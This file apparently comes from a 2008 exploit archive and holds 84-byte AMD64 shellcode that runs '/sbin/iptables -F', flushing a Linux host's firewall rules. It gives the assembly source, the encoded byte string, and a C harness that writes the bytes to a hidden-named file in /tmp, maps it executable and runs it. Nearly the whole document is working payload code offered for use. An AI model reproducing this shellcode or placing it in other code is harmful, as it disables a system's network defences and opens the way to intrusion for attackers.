/*

/sbin/iptables -F  shellcode for AMD64 (84 bytes)

By gat3way <gat3way(at )gat3way(dot)eu>


The code to load the sc[] into an executable mmap()-ed executable page
was shamelessly stolen by hophet (too lazy :))
Thanks Gustavo C. for the inspiration - x86_64 assembly is fun :)

# Here is the boring assembly code:
# push /sbin/iptables:
        movq    $0x73656c626174ffff, %rbx
        shr     $16, %rbx
        push    %rbx
        movq    $0x70692f6e6962732f, %rbx
        push    %rbx
        movq    %rsp, %rdi
# push params
        movq    $0x462dffffffffffff,%rbx
        shr     $48, %rbx
        push    %rbx
        movq    %rsp, %rcx
        movq    $0x46ffffffffffffff,%rbx
        shr     $56, %rbx
        push    %rbx
        movq    %rsp, %rax
        xor     %rbx, %rbx
        push    %rbx
        push    %rcx
        push    %rax
        movq    %rsp,%rsi
        movq    %rsp,%rdx
# execve
        xorq    %rax,%rax
        mov     $0x3b,%al
        syscall


Hm...pak ne moga da izmislia neshto umno :(

*/



#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <err.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>


char sc[]="\x48\xbb\xff\xff"
"\x74\x61\x62\x6c\x65\x73\x48\xc1\xeb\x10\x53\x48\xbb\x2f\x73\x62"
"\x69\x6e\x2f\x69\x70\x53\x48\x89\xe7\x48\xbb\xff\xff\xff\xff\xff"
"\xff\x2d\x46\x48\xc1\xeb\x30\x53\x48\x89\xe1\x48\xbb\xff\xff\xff"
"\xff\xff\xff\xff\x46\x48\xc1\xeb\x38\x53\x48\x89\xe0\x48\x31\xdb"
"\x53\x51\x50\x48\x89\xe6\x48\x89\xe2\x48\x31\xc0\xb0\x3b\x0f\x05";

void main()
{
        void (*p)();
        int fd;

        printf("Lenght: %d\n", strlen(sc));
        fd = open("/tmp/. ", O_RDWR|O_CREAT, S_IRUSR|S_IWUSR);
        if (fd < 0)
                err(1, "open");

        write(fd, sc, strlen(sc));
        if ((lseek(fd, 0L, SEEK_SET)) < 0)
                err(1, "lseek");

        p = (void (*)())mmap(NULL, strlen(sc), PROT_READ|PROT_EXEC, MAP_SHARED, fd, 0);
        if (p == (void (*)())MAP_FAILED)
                err(1, "mmap");
        p();
        return 0;
}

// milw0rm.com [2008-11-28]